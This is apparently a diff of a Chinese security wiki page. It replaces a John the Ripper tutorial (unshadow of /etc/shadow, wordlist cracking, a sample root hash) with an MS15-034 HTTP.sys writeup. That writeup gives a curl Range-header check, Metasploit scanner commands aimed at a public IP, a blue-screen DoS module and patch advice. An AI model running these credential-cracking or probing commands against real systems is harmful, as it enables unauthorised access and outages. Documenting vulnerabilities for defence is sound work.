@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="booom">
   <meta name="keywords" content="">
-  <title>爆破工具-john - wiki</title>
+  <title>Microsoft Windows HTTP.sys远程代码执行漏洞(CVE-2015-1635)(MS15-034) - wiki</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-09-07 15:45" pubdate>
-        2020年9月7日 下午
+      <time datetime="2020-10-27 08:51" pubdate>
+        2020年10月27日 早上
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      979 字
+      520 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11
+      6
        分钟
     </span>
   
@@ -217,86 +217,47 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">爆破工具-john</h1>
+            <h1 style="display: none">Microsoft Windows HTTP.sys远程代码执行漏洞(CVE-2015-1635)(MS15-034)</h1>
             
             <div class="markdown-body" id="post-body">
-              <h1 id="爆破工具-john"><a href="#爆破工具-john" class="headerlink" title="爆破工具-john"></a>爆破工具-john</h1><ul>
-<li>kali自带，网址：<a href="https://www.openwall.com/john/" target="_blank" rel="noopener">https://www.openwall.com/john/</a></li>
-<li>John the Ripper免费的开源软件，是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码</li>
-<li>John the ripper是一款基于字典的免费的密码破解工具。简单来说就是进行暴力密码破解，这种密码破解方式，耗费时间长、耗费处理器资源多。尝试的密码越多，所需的时间就越长</li>
-<li>起初，John the ripper是运行在Linux类平台上，现在可以运行在不同平台上。在安全服务项目中，主要采用了windows和linux下两个版本的工具。在进行实际测试中发现，windows下支持的密码HASH算法不是特别全面，后期采用Linux版本的John the ripper</li>
-</ul>
-<blockquote>
-<h3 id="密码文件"><a href="#密码文件" class="headerlink" title="密码文件"></a><strong>密码文件</strong></h3><ul>
-<li>John the ripper在安全服务项目中，主要用来测试Linux操作系统密码、AIX操作系统的密码。存放这个密码加密的文件分别是：/etc/shadow这个文件和/etc/security/passwd这个文件</li>
-</ul>
-</blockquote>
-<p> <strong>John支援了以下几种的破解方式：</strong></p>
-<ul>
-<li>有规则及不规则的字典档破解模式</li>
-<li>“Single Crack”, 用最简单的资讯来进行破解的工作, 速度最快</li>
-<li>增强破解模式(我们称暴力法), 尝试所有可能的字元组合</li>
-<li>外部破解模式, 让你可以定义你的破解模式</li>
-</ul>
-<h2 id="John-the-ripper特点"><a href="#John-the-ripper特点" class="headerlink" title="John the ripper特点"></a><strong>John the ripper特点</strong></h2><p>John the ripper在密码破解方面功能确实很强大，且密码破解效果比较好。但是在密码破解中存在一些问题。</p>
-<ul>
-<li>John the ripper一次性只能破解一个shadow。</li>
-<li>John the ripper破解时间长。</li>
-<li>Windows下John the ripper可破解的加密算法种类有限。</li>
-<li>破解过程中，需要人工参与，需要随时查看破解进度。</li>
-<li>需要收集一个针对特定行业的密码字典。</li>
-</ul>
-<h2 id="系统默认字典文件"><a href="#系统默认字典文件" class="headerlink" title="系统默认字典文件"></a>系统默认字典文件</h2><ul>
-<li>/usr/share/john/password.lst</li>
-<li>该文件收集了很多字符串密码。当你使用john破解密码时，john会去匹配该文件中的内容，如果密码存在于下面这个文件中，john就可以破解出来，如果不存在就破解不出来</li>
-<li>当然你也可以手动向这个文件中添加内容。或者自己建立字典文件，然后使用–wordlist参数调用字典文件</li>
-</ul>
-<h2 id="爆破实例"><a href="#爆破实例" class="headerlink" title="爆破实例"></a>爆破实例</h2><ol>
-<li><p>首先要生成一个密码字典</p>
-</li>
-<li><p>开始爆破</p>
-<blockquote>
-<p>其实在Linux操作系统中有很重要的一步：使用unshadow命令合并passwd与shadow文件，具体命令如下：</p>
-<p>unshadow /etc/passwd /etc/shadow &gt; CombinedFile.txt</p>
-<p>其中的CombinedFile.txt就是最后合并的密码文件，也是使用john进行破解的目标文件。</p>
-</blockquote>
-<p>最后破解命令是：</p>
-<p>john -wordlist PwdDictionary.txt CombinedFile.txt</p>
-<p><img src="https://s1.ax1x.com/2020/09/07/wuKN9A.png" srcset="/img/loading.gif" alt="wuKN9A.png"></p>
-</li>
-<li><p>查看结果</p>
-<p>结果会直接显示在运行界面中，也可以使用如下命令查看结果：</p>
-<p>john -show CombinedFile.txt</p>
-</li>
-</ol>
-<hr>
-<p>上面这个实例只爆破出admin用户的密码，没有爆破出root用户密码。</p>
+              <h1 id="Microsoft-Windows-HTTP-sys远程代码执行漏洞-CVE-2015-1635-MS15-034"><a href="#Microsoft-Windows-HTTP-sys远程代码执行漏洞-CVE-2015-1635-MS15-034" class="headerlink" title="Microsoft Windows HTTP.sys远程代码执行漏洞(CVE-2015-1635)(MS15-034)"></a><strong>Microsoft Windows HTTP.sys远程代码执行漏洞(CVE-2015-1635)(MS15-034)</strong></h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Http.sys是Microsoft Windows处理HTTP请求的内核驱动程序。</p>
+<p>HTTP.sys会错误解析某些特殊构造的HTTP请求，导致远程代码执行漏洞。成功利用此漏洞后，攻击者可在System帐户上下文中执行任意代码。</p>
+<p>由于此漏洞存在于内核驱动程序中，攻击者也可以远程导致操作系统蓝屏。远程攻击者可以通过IIS 7（或更高版本）服务将恶意的HTTP请求传递给HTTP.sys驱动。</p>
+<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>Microsoft Windows Server 2012 R2<br>Microsoft Windows Server 2012<br>Microsoft Windows Server 2008 R2<br>Microsoft Windows 8.1<br>Microsoft Windows 8<br>Microsoft Windows 7</p>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>1、通过curl命令实现</p>
+<pre><code class="hljs lsl">curl -v <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -H <span class="hljs-string">"Host:irrelevant"</span> -H <span class="hljs-string">"Range: bytes=0-18446744073709551615"</span></code></pre>
+
+<p>如果服务器打上了补丁，那么响应状态应该是：</p>
 <ol>
-<li><p>破解root密码，查看/etc/shadow文件内容，复制加密后的密文</p>
-<p><img src="https://s1.ax1x.com/2020/09/07/wuK6hj.png" srcset="/img/loading.gif" alt="wuK6hj.png"></p>
-<p><code>$6$i9PZlNKY1JSE8dkG$1eCFIsAtnxzHfhZ/tw3FUBr/2NMZOlM.8HmSA4KYy9SfBBBTEUj2JS79tvudskedc7bUp9EMktTGXsbl
-pALbl.</code></p>
-</li>
-<li><p>新建文件，将密文复制到新建文件中。</p>
-<p><img src="https://s1.ax1x.com/2020/09/07/wuKRcq.png" srcset="/img/loading.gif" alt="wuKRcq.png"></p>
-</li>
-<li><p>john -wordlist /root/Desktop/password_top100.txt ./hash</p>
-<p>跑出root密码，忘记截图了。</p>
-<blockquote>
-<p>在网上找到如下回答：</p>
-<p>john工具对于同一个shadow文件只会进行一次爆破，如果第二次执行john shadow是不会得到结果的，只会得到如下输出。</p>
-<p><img src="https://s1.ax1x.com/2020/09/07/wuK74J.png" srcset="/img/loading.gif" alt="wuK74J.png"></p>
-</blockquote>
-</li>
-<li><p>查看密码</p>
-<p><img src="https://s1.ax1x.com/2020/09/07/wuKvDK.png" srcset="/img/loading.gif" alt="wuKvDK.png"></p>
-<p>查看john.pot文件</p>
-<p><img src="https://s1.ax1x.com/2020/09/07/wuMFgI.png" srcset="/img/loading.gif" alt="wuMFgI.png"></p>
-</li>
+<li>HTTP Error 400. The request has an invalid header name.</li>
 </ol>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/FunkyPants/article/details/78648109" target="_blank" rel="noopener">https://blog.csdn.net/FunkyPants/article/details/78648109</a></p>
-<p><a href="https://www.jianshu.com/p/bed96891dc3e" target="_blank" rel="noopener">https://www.jianshu.com/p/bed96891dc3e</a></p>
-<p><a href="https://blog.csdn.net/qq_41453285/article/details/101049848" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/101049848</a></p>
+<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该是：</p>
+<ol>
+<li>HTTP/1.1 416 Requested Range Not Satisfiable</li>
+</ol>
+<p>2、使用MSF中palyload进行测试，不会导致主机蓝屏。</p>
+<pre><code class="hljs angelscript">msf &gt; use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
+msf auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; ``<span class="hljs-keyword">set</span>` `rhosts <span class="hljs-number">218.94</span><span class="hljs-number">.138</span><span class="hljs-number">.251</span>
+rhosts =&gt; <span class="hljs-number">218.94</span><span class="hljs-number">.138</span><span class="hljs-number">.251</span>
+msf auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; run</code></pre>
+
+<p>结果</p>
+<pre><code class="hljs prolog">[+] <span class="hljs-symbol">Target</span> may be vulnerable...  #验证存在
+[+] <span class="hljs-symbol">Stand</span> <span class="hljs-string">``</span>by<span class="hljs-string">``</span>...
+[*] <span class="hljs-symbol">Scanned</span> <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span><span class="hljs-comment">% complete)</span>
+[*] <span class="hljs-symbol">Auxiliary</span> module execution completed</code></pre>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用kali中metasploit的模块进行漏洞利用，会导致主机蓝屏，谨慎使用。</p>
+<ul>
+<li>use auxiliary/dos/http/ms15_034_ulonglongadd</li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//m</span>p.weixin.qq.com<span class="hljs-regexp">/s/</span>ZdRu_smJ0IW-dVVb9YB6UQ</code></pre>
+
+<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>Microsoft已经为此发布了一个安全公告（MS15-034）以及相应补丁:<br>MS15-034：Vulnerability in HTTP.sys Could Allow Remote Code Execution (3042553)<br>链接：<a href="http://technet.microsoft.com/security/bulletin/MS15-034" target="_blank" rel="noopener">http://technet.microsoft.com/security/bulletin/MS15-034</a></p>
+<p><strong>临时解决方法：</strong>如果您不能立刻安装补丁或者升级，建议您采取以下措施以降低威胁：</p>
+<p>* 可通过禁用IIS 内核缓存来临时缓解此漏洞的危险，但这可能会导致IIS性能下降。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/someone9/p/9372163.html" target="_blank" rel="noopener">https://www.cnblogs.com/someone9/p/9372163.html</a></p>
+<p><a href="https://www.tfzx.net/article/4758916.html" target="_blank" rel="noopener">https://www.tfzx.net/article/4758916.html</a></p>
 
             </div>
             <hr>
@@ -306,7 +267,7 @@ pALbl.</code></p>
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/tool/">tool</a>
+                      <a class="hover-with-bg" href="/categories/windows/">windows</a>
                     
                   </div>
                 
@@ -314,7 +275,7 @@ pALbl.</code></p>
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/john/">john</a>
+                      <a class="hover-with-bg" href="/tags/cve/">cve</a>
                     
                   </div>
                 
@@ -327,9 +288,9 @@ pALbl.</code></p>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/09/08/gobuster/">
+                      <a href="/2020/10/27/oracle-TNS-Listener%E8%BF%9C%E7%A8%8B%E6%8A%95%E6%AF%92%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2012-1675%EF%BC%89/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">gobuster学习记录</span>
+                        <span class="hidden-mobile">oracle TNS Listener远程投毒漏洞（CVE-2012-1675）</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -337,8 +298,8 @@ pALbl.</code></p>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/09/03/whatweb/">
-                        <span class="hidden-mobile">网站指纹识别-whatweb</span>
+                      <a href="/2020/10/25/Samba-CVE-2017-7494/">
+                        <span class="hidden-mobile">Samba远程代码执行漏洞(CVE-2017-7494)</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -534,7 +495,7 @@ pALbl.</code></p>
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "爆破工具-john&nbsp;",
+        "Microsoft Windows HTTP.sys远程代码执行漏洞(CVE-2015-1635)(MS15-034)&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
